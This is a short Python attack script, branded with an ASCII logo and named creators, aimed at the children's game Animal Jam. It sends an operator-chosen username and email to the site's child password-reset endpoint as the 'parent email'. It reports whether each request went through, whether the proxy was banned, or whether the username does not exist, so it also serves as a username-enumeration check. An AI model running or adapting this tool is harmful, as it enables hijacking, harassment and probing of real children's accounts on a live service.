import requests, sys
from colorama import Fore
def logo():
    return f''' {Fore.MAGENTA}
         █████╗      ██╗███████╗
        ██╔══██╗     ██║╚══███╔╝
        ███████║     ██║  ███╔╝ 
        ██╔══██║██   ██║ ███╔╝  
        ██║  ██║╚█████╔╝███████╗
        ╚═╝  ╚═╝ ╚════╝ ╚══════╝
     {Fore.MAGENTA}Creators: {Fore.GREEN}JamesMagellan x IRIS
{Fore.RESET}
'''

def main():
	print(logo())
	username = input("Username: ")
	email = input("Email: ")
	url = 'https://www.animaljam.com/child_request_reset_password'
	r=requests.post(url=url, data={'parent_email': email, 'username': username})

	if r.status_code == 200:
		print(f'{Fore.GREEN}[+] Request Sent {username}:{email}')

	if r.status_code == 403:
		print(f'{Fore.RED}[-] Banned Proxy {username}:{email}')

	if r.status_code == 422:
		print(f'{Fore.YELLOW}[!] Username Doesn\'t Exist {username}:{email}')


main()